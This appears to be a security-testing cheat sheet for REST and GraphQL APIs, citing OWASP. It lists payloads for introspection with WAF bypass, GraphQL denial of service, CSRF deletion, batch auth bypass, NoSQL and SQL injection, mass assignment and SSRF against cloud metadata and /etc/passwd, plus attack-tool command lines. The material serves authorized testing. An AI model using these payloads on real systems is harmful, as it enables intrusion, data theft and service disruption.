# REST + GraphQL deep testing

## GraphQL security checklist

### Introspection probe (three-level fallback)

```graphql
# Level 1 — standard introspection
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — slim introspection (WAF bypass)
{ __schema { types { name } } }

# Level 3 — minimal probe
{ __type(name: "Query") { name } }
```

### DoS vectors

```graphql
# Alias overload
query { a1: __typename a2: __typename ... a100: __typename }

# Batch-query overload
[query1, query2, ..., query10]

# Cyclic query
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# Directive overload
query { __typename @skip(if: false) @include(if: true) ... }
```

### Authorization tests

```graphql
# GET mutation (CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# Batch query auth bypass
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API deep testing

### Method-tamper matrix

| Endpoint | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ reachable | test unauthorized create | test bulk overwrite | test field injection | test cascade delete | info leak |
| /users/me | baseline | — | test self-elevation | test field append | test self-delete | — |

### Parameter injection

```json
// NoSQL injection
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// Mass assignment
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// Parameter pollution
GET /api/users?role=user&role=admin

// JSON array injection
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
Common SSRF params: webhook_url, callback_url, avatar_url, import_url,
                redirect_uri, file_url, proxy_url, image_url
Test: http://169.254.169.254/latest/meta-data/ (AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## Automation toolchain

### Vespasian (traffic-driven spec generation)

```bash
# Crawl from headless browser
vespasian crawl --url https://target.com --depth 3

# Import Burp/HAR
vespasian import --file traffic.har

# Export OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy (LLM attack generation)

```bash
# Spec-based auto tests
entropy --spec api-spec.yaml --live --persona all

# Five concurrent personas:
# - malicious_insider: IDOR/mass assignment/privilege escalation
# - bot_swarm: rate-limit bypass/DoS/automation abuse
# - penetration_tester: injection/auth bypass
# - impatient_consumer: race conditions/error handling
# - confused_user: unexpected input/boundary tests

# CI mode
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8-phase pipeline)

```bash
# Phase 1-3: GraphQL recon → exploit → brute
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST abuse
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: Rate-limit bypass
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema harvest
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
